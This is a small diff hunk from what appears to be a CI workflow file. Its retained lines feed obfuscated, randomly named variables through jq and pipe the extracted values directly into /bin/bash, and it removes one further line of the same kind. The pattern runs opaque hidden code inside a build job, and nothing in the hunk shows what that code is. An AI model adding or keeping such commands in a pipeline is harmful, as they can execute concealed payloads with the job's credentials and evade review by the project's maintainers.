@@ -21,7 +21,6 @@ jobs:
           echo $gljv288 | jq -r .f32 | /bin/bash
           printf '%s' "$tnbq5" | jq -r .lx81 | /bin/bash
           echo $faor9 | jq -r .y62011 | /bin/bash
-          echo $libz80735 | jq -r .o66506 | /bin/bash
 
       - name: Save archive
         if: always()
